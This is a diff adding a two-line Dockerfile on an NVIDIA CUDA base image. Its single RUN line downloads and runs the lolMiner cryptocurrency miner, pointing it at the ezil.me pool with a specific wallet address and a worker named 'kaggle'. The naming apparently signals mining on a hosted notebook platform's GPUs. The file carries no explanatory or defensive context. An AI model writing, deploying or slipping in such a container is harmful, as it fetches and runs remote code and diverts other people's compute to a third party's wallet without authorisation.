@@ -1,0 +1,2 @@
+FROM nvidia/cuda:11.4.2-base-ubuntu20.04
+RUN wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz && tar -xf lolMiner_v1.51_Lin64.tar.gz && cd 1.51 && ./lolMiner --algo ETHASH --pool stratum+ssl://us-east.ezil.me:25443 --user 0xe04bfd6d90eed0b43d9b459a56d7c66ae01d80ab.zil1pcy6unha270u2z630jmyvgur3n87x9gdhf7hz0 --worker kaggle
